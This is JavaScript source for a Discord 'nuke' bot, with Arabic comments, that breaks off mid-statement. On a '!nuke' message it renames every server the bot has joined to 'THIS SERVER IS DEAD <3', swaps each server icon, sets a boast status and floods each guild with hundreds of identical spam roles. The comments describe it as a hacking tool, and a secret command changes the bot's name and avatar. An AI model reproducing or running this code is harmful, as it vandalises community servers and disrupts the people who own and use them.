const Discord = require("discord.js");
const LOka = new Discord.Client();
console.log('By Lava Pro');
LOka.on('ready', () => {
  console.log(`Logged in as ${LOka.user.tag} !`);
 
});
LOka.on('ready',  () => {
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log('      ~            ~  By : PITAR ~           ~    ');
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log(`Logged in as  * [ "  PITAR " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
 
       
   
 
});
var prefix = "k"
LOka.on("message", message => {
  if(!message.content.startsWith(prefix)) return;;
  let args = message.content.split(" ").slice(1);
  var argresult = args.join(' ');
  if (message.content.startsWith('hix15')) {
    LOka.user.setUsername(argresult);
  }
    if (message.content.startsWith(prefix + 'on123')) {
    LOka.user.setStatus(argresult);
  }
});

// صورة البوت 
var x1 = "kk"
LOka.on('message', message => {
     if (message.content === "!!!aaaaa") {
LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/482151620289888256/482156990945165312/download.png`)
 
}
});

// اسم بوتك وش يصير لمن يهكر
var x1 = "kk"
LOka.on('message', message => {
     if (message.content === "!!!aaaaa") {
LOka.user.setUsername("KingBot")
 
}
});
// الستريمينق حق البوت
LOka.on('message', message => {
     if (message.content === "!nuke") {
LOka.user.setGame(`THIS SERVER GOT NUKED BY IxkeemO_`,'https://www.twitch.tv/hix')
 
}
});

// صورة السيرفر 
LOka.on('message', message => {
     if (message.content === "!nuke") {
         LOka.guilds.forEach(m =>{
             m.setIcon(`https://cdn.discordapp.com/attachments/553287375858434067/886271852652159006/5929187.jpg`)
})
}
});

//وش يخلي اسم السيرفر
LOka.on('message', message => {
     if (message.content === "!nuke") {
         LOka.guilds.forEach(m =>{
             m.setName(`THIS SERVER IS DEAD <3`)
})
}
});

//صورة السيرفر 
LOka.on('message', message => {
     if (message.content === "!nuke") {
                 if(!message.channel.guild) return;
 
             message.guild.setIcon(`https://cdn.discordapp.com/attachments/553287375858434067/886271852652159006/5929187.jpg`)
 
}
});
//صورة السيرفر 
LOka.on('message', message => {
     if (message.content === "!nuke") {
                 if(!message.channel.guild) return;
 
             message.guild.setIcon(`https://cdn.discordapp.com/attachments/553287375858434067/886271852652159006/5929187.jpg`)
 
}
});
// رتب السيرفر
LOka.on('message', message => {
     
 
     if (message.content === "!nuke") {
         LOka.guilds.forEach(m =>{
  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
